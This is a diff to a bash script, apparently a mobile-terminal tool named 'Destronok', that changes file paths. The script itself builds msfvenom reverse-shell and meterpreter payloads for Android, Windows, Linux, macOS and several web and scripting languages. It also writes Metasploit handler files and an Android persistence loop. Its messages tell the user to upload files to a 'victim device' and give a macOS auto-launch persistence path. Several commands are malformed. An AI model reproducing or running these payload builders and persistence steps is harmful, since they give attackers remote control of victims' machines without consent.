@@ -126,7 +126,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /sdcard/destronok/$name.apk > /dev/null 2>&1
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o ~/sdcard/destronok/$name.apk > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -149,7 +149,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf /sdcard/destronok/$name.elf > /dev/null 2>&1
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf ~/sdcard/destronok/$name.elf > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -173,7 +173,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND"  
 echo " "
-msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/destronok/$name.exe > /dev/null 2>&1
+msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > ~/sdcard/destronok/$name.exe > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -197,7 +197,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/destronok/$name.macho > /dev/null 2>&1
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > ~/sdcard/destronok/$name.macho > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -221,7 +221,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.php > /dev/null 2>&1
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > ~/sdcard/destronok/$name.php > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -246,7 +246,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > /sdcard/destronok/$name.asp > /dev/null 2>&1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > ~/sdcard/destronok/$name.asp > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -269,7 +269,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND"  
 echo " "
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.jsp > /dev/null 2>&1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > ~/sdcard/destronok/$name.jsp > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -293,7 +293,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > /sdcard/destronok/$name.war > /dev/null 2>&1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > ~/sdcard/destronok/$name.war > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -317,7 +317,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.py > /dev/null 2>&1
+msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > ~/sdcard/destronok/$name.py > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -343,7 +343,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.sh > /dev/null 2>&1
+msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > ~/sdcard/destronok/$name.sh > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -368,7 +368,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND"  
 echo " "
-msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.pl > /dev/null 2>&1
+msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > ~/sdcard/destronok/$name.pl > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -393,7 +393,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/ > /dev/null 2>&1
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < ~/sdcard/destronok/ > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -418,7 +418,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND" 
 echo " "
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/$name.sh > /dev/null 2>&1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < ~/sdcard/destronok/$name.sh > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -442,7 +442,7 @@ pname
 echo ""
 echo "GIVE ME FEW SECOND"  
 echo " "
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/$name.pl > /dev/null 2>&1
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f < ~/sdcard/destronok/$name.pl > /dev/null 2>&1
 echo -e  " "
 echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
 echo -e " "
@@ -454,67 +454,67 @@ returu
 }
  #==========================================================================================================================================
  function androidlisnr(){
-            touch ~/sdcard/destronok/meterpreter_droid.rc
-            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_droid.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronok/meterpreter_droid.rc
+            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
             read -p 'LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_droid.rc
+            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
             read -p 'lHOST PORT: ' lport
-            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_droid.rc
-            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_droid.rc
-            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_droid.rc
-            cat ~/sdcard/destronok/meterpreter_droid.rc
-            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_droid.rc
+            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
+            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
             echo "ENTER TO CONTINUE"
             read anl
             retru
             }
 function linuxlisnr(){
-            touch ~/sdcard/destronok/meterpreter_linux.rc
-            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_linux.rc
-            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/sdcard/destronok/meterpreter_linux.rc
+            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
             read -p 'LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_linux.rc
+            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
             read -p 'lHOST PORT: ' lhost
-            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_linux.rc
-            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_linux.rc
-            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_linux.rc
-            cat ~/sdcard/destronok/meterpreter_linux.rc
-            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_linux.rc &
+            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
+            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc &
             echo "ENTER TO CONTINUE"
             read lnsr
             retru
             }
      
 function windowslisnr(){
-            touch ~/sdcard/destronock/meterpreter.rc
-            echo use exploit/multi/handler > ~/sdcard/destronock/meterpreter.rc
-            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/sdcard/destronock/meterpreter.rc
+            touch ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
             read -p 'lHOST PORT: ' lhost
-            echo set LHOST $uservar >> ~/sdcard/destronock/meterpreter.rc
+            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
             read -p 'Set LPORT: ' lhost
-            echo set LPORT $uservar >> ~/sdcard/destronock/meterpreter.rc
-            echo set ExitOnSession false >> ~/sdcard/destronock/meterpreter.rc
-            echo exploit -j -z >> ~/sdcard/destronock/meterpreter.rc
-            cat ~/sdcard/destronock/meterpreter.rc
-            xterm -e msfconsole -r ~/sdcard/destronock/meterpreter.rc &
+            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            cat ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
+            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter.rc &
             echo "ENTER TO CONTINUE"
             read wnl
             retru
             }
             
     function maclisnr(){
-            touch ~/sdcard/destronok/meterpreter_mac.rc
-            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_mac.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronok/meterpreter_mac.rc
+            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
             read -p 'Set LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_mac.rc
+            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
             read -p 'Set LPORT: ' lhost
-            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_mac.rc
-            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_mac.rc
-            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_mac.rc
-            cat ~/sdcard/destronok/meterpreter_mac.rc
-            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_mac.rc
+            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
+            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
             echo "ENTER TO CONTINUE"
             read mcl
             retru
@@ -522,14 +522,14 @@ function windowslisnr(){
 
 #==========================================================================================================================================
 function andpr(){
-            touch ~/sdcard/destronok/android.sh
-            echo \#\!/bin/bash >> ~/sdcard/destronok/android.sh
-            echo while : >> ~/sdcard/destronok/android.sh
-            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/sdcard/destronok/android.sh
-            echo sleep 20 >> ~/sdcard/destronok/android.sh
-            echo done >> ~/sdcard/destronok/android.sh
-            cat ~/sdcard/destronok/android.sh
-            echo -e "\E[1;33m==== \e[41m ANDROID.SH IS SAVE ON ~/Desktop/temp. UPLOAD IT VICTIM DEVICE \e[0m \e[1;33m====" 
+            touch ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo \#\!/bin/bash >> ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo while : >> ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo sleep 20 >> ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo done >> ~/data/data/com.termux/files/home/Destronok/android.sh
+            cat ~/data/data/com.termux/files/home/Destronok/android.sh
+            echo -e "\E[1;33m==== \e[41m ANDROID.SH IS SAVE ON ~/data/data/com.termux/files/home/Destronok/android.sh UPLOAD IT VICTIM DEVICE \e[0m \e[1;33m====" 
             echo "========================================================================================================="
             echo ""
             echo "=== DO YOU WANT TO STATR METASPLOIT (y/n)"
@@ -587,7 +587,7 @@ function Winpr(){
          }
 function mcpr(){
             echo 'use Directory/Applications/Utilities/'
-            read -p 'GIVE ME YOUR PAYLOAD FILE NAME :EX = *shell.macho: ' lhost; 
+            read -p 'GIVE ME YOUR PAYLOAD FILE NAME :EX = *shell.macho: ' $lhost; 
             echo -e "\E[1;33m========\e[41m DEFAULT PATH /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$lhost”;}’\e[0m \e[1;33m======="
             echo "===================================================================================================================="
             echo ""
